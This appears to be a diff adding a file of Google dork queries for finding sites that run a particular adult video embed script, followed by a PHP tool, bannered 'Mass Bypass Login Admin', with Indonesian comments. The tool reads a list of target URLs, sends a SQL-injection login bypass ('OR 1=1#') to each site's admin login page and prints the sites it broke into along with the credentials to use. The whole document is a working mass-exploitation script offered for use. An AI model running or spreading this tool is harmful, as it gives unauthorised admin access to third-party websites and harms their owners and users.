@@ -1,0 +1,46 @@
+- inurl:/ajax/videos_home.php?action= site:.com
+- inurl:/static/3/dmca.html
+- intext:"Your own text or Link here" Copyright © 2015
+- intext:Copyright © 2015 Adult Embed Script All Rights Reserved.
+- intext:Your own text or Link here porn inurl:channel
+
+<?php
+//Jangan mengganti code, ingat case sensitive, be careful bebi :3
+print '
+#====================================================#
+# Magelang1337.com | Mass Bypass Login Admin #
+#====================================================#
+';
+$get=file_get_contents($argv[1])
+or die("
+\n\tYo gak kenek -_- !
+\n\tCarane => php namasekripmu.php listtarget.txt\n\n");
+$j=explode("\r\n",$get);
+foreach($j as $url){
+print "\n\n\t======================================================";
+print "\n\t[!] Check : ".$url;
+$page = "/admin/index.php";
+$postdata = 'action=dologin&uname=ADMIN%27+OR+1%3D1%23&pass=ADMIN%27+OR+1%3D1%23&submit=Admin+Login';
+$ch = curl_init();
+curl_setopt ($ch, CURLOPT_URL, $url.$page);
+curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
+curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
+curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata);
+curl_setopt ($ch, CURLOPT_POST, 1);
+curl_setopt ($ch, CURLOPT_HEADER, 1);
+$result = curl_exec ($ch);
+curl_close($ch);
+ 
+if(preg_match('#/admin/main.php#',$result)){
+print "\n\t[+] Hasil : Bypassed OK ! ";
+print "\n\t[+] Loginmu : ".$url."/admin/index.php";
+print "\n\t[+] Username : '=''OR'";
+print "\n\t[+] Password : '=''OR'";
+print "\n\t======================================================\n";
+}else {
+print "\n\t[-] Hasil : Gagal Bypass Gans ._.";
+print "\n\t======================================================\n";
+}
+}
+?>
